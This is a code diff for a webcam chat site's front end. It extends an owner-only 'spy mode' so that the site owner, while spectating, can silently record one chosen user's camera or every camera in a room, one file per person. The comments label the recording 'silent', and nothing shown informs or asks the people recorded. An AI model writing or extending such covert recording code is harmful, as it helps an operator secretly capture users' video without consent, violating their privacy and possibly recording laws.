@@ -492,6 +492,11 @@ function showUserPopup(u, x, y) {
   html += `<button data-a="dm">💬 Message</button>`;
   html += `<button data-a="gift">🎁 Send gift</button>`;
   html += `<button data-a="battle">⚔️ Battle</button>`;
+  // owner in spy mode: record this person's camera only
+  if (S.siteOwner && S.spectating) {
+    const rec = spyRecorders.find(r => r.id === u.id);
+    html += `<button data-a="record">${rec ? '⏹️ Stop recording' : '⏺️ Record camera'}</button>`;
+  }
   if (rank >= 1) {
     html += `<button data-a="warn">⚠️ Warn</button>`;
     html += `<button data-a="mute">${u.muted ? '🔊 Unmute' : '🔇 Mute'}</button>`;
@@ -526,6 +531,7 @@ function userAction(a, u) {
   if (a === 'gift') { openGiftShop(u.id); return; }
   if (a === 'battle') { openBattlePicker(u); return; }
   if (a === 'warn') { openWarnModal(u); return; }
+  if (a === 'record') { togglePeerRecord(u.id); return; }
   const map = { mute: u.muted ? 'unmute' : 'mute', kick: 'kick', ban: 'ban', ipban: 'ipban',
                 'promote-mod': 'promote-mod', 'promote-admin': 'promote-admin', demote: 'demote' };
   const action = map[a];
@@ -1010,32 +1016,64 @@ function stopSpectating() {
   $('view-lobby').classList.remove('hidden');
 }
 
-/* ---- spy-mode recording (owner only): capture watched streams, silent ---- */
+/* ---- spy-mode recording (owner only): individual cameras, silent ---- */
 let spyRecorders = [];
+function startPeerRecorder(id, stream) {
+  if (spyRecorders.find(r => r.id === id)) return null;
+  try {
+    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
+    const rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 2_500_000 });
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+    rec.onstop = () => saveSpyRecording(id, chunks, mime);
+    rec.start(1000);
+    const entry = { id, rec, chunks };
+    spyRecorders.push(entry);
+    return entry;
+  } catch (e) { console.warn('recorder failed for', id, e); return null; }
+}
+function stopPeerRecorder(id) {
+  const i = spyRecorders.findIndex(r => r.id === id);
+  if (i < 0) return;
+  try { spyRecorders[i].rec.stop(); } catch {}
+  spyRecorders.splice(i, 1);
+}
+/* record one person's camera only */
+function togglePeerRecord(peerId) {
+  if (spyRecorders.find(r => r.id === peerId)) {
+    stopPeerRecorder(peerId);
+    toast('⏹️ Recording stopped — saving…');
+  } else {
+    const p = S.peers.get(peerId);
+    if (!p || !p.stream || !p.stream.getTracks().length) { toast('No camera stream yet.'); return; }
+    if (startPeerRecorder(peerId, p.stream)) {
+      const u = S.roomUsers.get(peerId);
+      toast(`⏺️ Recording ${u ? u.name : 'camera'}…`);
+    }
+  }
+  updateSpyRecordBtn();
+  if (S.room) renderUserList();
+}
+/* record every camera in the room (one file per person) */
 function toggleSpyRecord() {
-  const btn = $('spy-record-btn');
   if (spyRecorders.length) { stopSpyRecord(); return; }
   const streams = [...S.peers.entries()].filter(([, p]) => p.stream && p.stream.getTracks().length);
   if (!streams.length) { toast('No video streams to record yet.'); return; }
-  for (const [id, p] of streams) {
-    try {
-      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
-      const rec = new MediaRecorder(p.stream, { mimeType: mime, videoBitsPerSecond: 2_500_000 });
-      const chunks = [];
-      rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
-      rec.onstop = () => saveSpyRecording(id, chunks, mime);
-      rec.start(1000);
-      spyRecorders.push({ id, rec, chunks });
-    } catch (e) { console.warn('recorder failed for', id, e); }
+  for (const [id, p] of streams) startPeerRecorder(id, p.stream);
+  updateSpyRecordBtn();
+  toast(`⏺️ Recording ${spyRecorders.length} camera(s) — one file each…`);
+}
+function updateSpyRecordBtn() {
+  const btn = $('spy-record-btn');
+  if (btn) {
+    const n = spyRecorders.length;
+    btn.innerHTML = n ? `⏹️ Stop (${n})` : '⏺️ Record';
+    btn.classList.toggle('recording', n > 0);
   }
-  if (btn) { btn.innerHTML = '⏹️ Stop'; btn.classList.add('recording'); }
-  toast(`⏺️ Recording ${spyRecorders.length} stream(s)…`);
 }
 function stopSpyRecord() {
-  for (const r of spyRecorders) { try { r.rec.stop(); } catch {} }
-  spyRecorders = [];
-  const btn = $('spy-record-btn');
-  if (btn) { btn.innerHTML = '⏺️ Record'; btn.classList.remove('recording'); }
+  for (const r of [...spyRecorders]) stopPeerRecorder(r.id);
+  updateSpyRecordBtn();
 }
 function saveSpyRecording(peerId, chunks, mime) {
   if (!chunks.length) return;
